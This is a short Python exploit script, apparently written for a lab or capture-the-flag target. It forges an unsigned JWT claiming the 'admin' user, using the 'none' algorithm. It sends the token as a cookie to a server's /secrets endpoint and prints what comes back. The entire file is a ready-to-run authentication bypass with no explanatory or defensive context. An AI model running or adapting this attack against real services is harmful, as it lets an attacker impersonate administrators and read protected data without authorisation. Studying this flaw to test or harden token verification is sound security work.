import jwt
import requests
import argparse

payload = {"user": "admin"}

parser = argparse.ArgumentParser()
parser.add_argument("--host", help="Server host")
args = parser.parse_args()

host = args.host or "http://localhost:500"

# Generate a token with none algorithm
token = jwt.encode(payload, key=None, algorithm=None)

# Send the token to the server
cookies = {"token": token}
req = requests.get(f"{host}/secrets", cookies=cookies)
print(req.text)
